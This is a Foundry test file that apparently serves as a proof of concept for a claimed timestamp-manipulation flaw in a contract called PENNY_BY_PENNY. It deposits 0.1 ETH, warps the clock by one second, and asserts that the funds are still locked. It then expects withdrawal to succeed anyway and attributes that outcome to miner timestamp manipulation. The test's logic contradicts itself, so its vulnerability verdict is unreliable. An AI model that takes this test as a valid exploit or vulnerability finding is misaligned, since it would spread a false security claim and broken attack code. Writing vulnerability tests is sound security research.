// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";

contract PennyByPennyTest is Test {
    PENNY_BY_PENNY public penny;
    LogFile public logFile;
    address public user = makeAddr("user");

    function setUp() public {
        logFile = new LogFile();
        penny = new PENNY_BY_PENNY();
        penny.SetLogFile(address(logFile));
        penny.SetMinSum(0.1 ether);
    }

    function testTimestampManipulation() public {
        // Pre-Deposit: Account state should be 0
        console.log("--- BEFORE-Deposit ---");
        uint256 userEthBalanceBefore = user.balance;
        (uint256 userContractBalanceBefore, uint256 userUnlockTimeBefore) = penny.Acc(user);
        console.log("User ETH Balance:", userEthBalanceBefore);
        console.log("Contract recorded balance:", userContractBalanceBefore);
        console.log("Contract recorded unlockTime:", userUnlockTimeBefore);

        // Deposit 0.1 ETH
        console.log("--- Trigger: Deposit 0.1 ETH ---");
        vm.deal(user, 0.1 ether);
        vm.prank(user);
        (bool depositSuccess,) = address(penny).call{value: 0.1 ether}("");
        assertTrue(depositSuccess, "Deposit should succeed");

        // Verify deposit recorded
        console.log("--- AFTER-Deposit ---");
        uint256 userEthBalanceAfterDeposit = user.balance;
        (uint256 userContractBalanceAfterDeposit, uint256 userUnlockTimeAfterDeposit) = penny.Acc(user);
        console.log("User ETH Balance:", userEthBalanceAfterDeposit);
        console.log("Contract recorded balance:", userContractBalanceAfterDeposit);
        console.log("Contract recorded unlockTime:", userUnlockTimeAfterDeposit);

        // Validate state changes
        assertEq(userEthBalanceAfterDeposit, userEthBalanceBefore - 0.1 ether);
        assertEq(userContractBalanceAfterDeposit, userContractBalanceBefore + 0.1 ether);
        assertEq(userUnlockTimeAfterDeposit, block.timestamp + 30 days);

        // Attempt immediate withdrawal (should fail)
        console.log("--- Trigger: Immediate Withdrawal Attempt ---");
        vm.prank(user);
        vm.expectRevert();
        penny.Collect(0.1 ether);

        // Warp timestamp +1 second
        console.log("--- Trigger: Timestamp Warp (+1 second) ---");
        vm.warp(block.timestamp + 1);
        console.log("New block timestamp:", block.timestamp);
        console.log("Contract unlockTime:", userUnlockTimeAfterDeposit);
        
        // Verify warp didn't satisfy lock time
        (uint256 userContractBalancePreWithdraw,) = penny.Acc(user);
        assertGt(
            userUnlockTimeAfterDeposit, 
            block.timestamp, 
            "Funds should still be locked"
        );

        // Attempt withdrawal after warp
        console.log("--- Trigger: Withdrawal After Warp ---");
        uint256 userEthBalancePreWithdraw = user.balance;
        vm.prank(user);
        penny.Collect(0.1 ether);

        // Post-Withdrawal state
        console.log("--- AFTER-Withdrawal ---");
        uint256 userEthBalanceAfter = user.balance;
        (uint256 userContractBalanceAfter, uint256 userUnlockTimeAfter) = penny.Acc(user);
        console.log("User ETH Balance:", userEthBalanceAfter);
        console.log("Contract recorded balance:", userContractBalanceAfter);
        console.log("Contract recorded unlockTime:", userUnlockTimeAfter);

        // Vulnerability verification
        uint256 ethGained = userEthBalanceAfter - userEthBalancePreWithdraw;
        if (ethGained == 0.1 ether) {
            console.log("Vulnerability Exists: Miner timestamp manipulation bypassed withdrawal lock");
        } else {
            console.log("Vulnerability not Exist: Withdrawal lock enforcement works");
        }
        
        // Final assertion with vulnerability verdict
        assertEq(
            userContractBalanceAfter, 
            0, 
            "Contract should reset account balance"
        );
        assertEq(
            ethGained,
            0.1 ether,
            "Vulnerability verification failed"
        );
    }
}